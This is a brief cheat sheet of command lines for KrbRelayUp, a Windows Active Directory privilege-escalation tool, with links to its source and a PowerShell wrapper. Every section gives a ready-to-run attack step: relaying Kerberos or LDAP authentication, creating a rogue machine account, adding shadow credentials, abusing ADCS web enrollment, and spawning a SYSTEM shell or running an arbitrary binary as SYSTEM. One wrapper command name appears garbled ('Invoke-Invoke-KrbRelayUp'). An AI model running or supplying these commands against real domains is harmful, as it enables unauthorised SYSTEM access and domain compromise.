### Source
https://github.com/Dec0ne/KrbRelayUp
https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-KrbRelayUp.ps1

### Relay ldap request to local Service Manager, -c = create new machine account (requires LDAP Signing not to be enforced)
```
KrbRelayUp.exe relay -d &lt;domain&gt; -c -cn &lt;newComputer&gt; -cp &lt;newPassword&gt;
```

### Request TGS to create new service running as SYSTEM
```
KrbRelayUp.exe spawn -d &lt;domain&gt; -cn &lt;newComputer&gt; -cp &lt;newPassword&gt; 
```

### Request TGS to create new service running as SYSTEM and execute given binary
```
Invoke-Invoke-KrbRelayUp -Command 'spawn -d &lt;domain&gt; -cn &lt;computername&gt; -cp &lt;computerpassword&gt; -sc C:\path\executable.exe'
```

### Start SYSTEM cmd shell, -f = force shadow (clear msDS-KeyCredentialLink before adding new shadow creds)
```
KrbRelayUp.exe full -m shadowcred -f
```

### Relay machine kerberos auth to ADCS Web Enrollment (instead LDAP), -ca = default is domain controller
```
KrbRelayUp.exe full -m adcs -ca &lt;certificateAuthorityFqdn&gt;
```


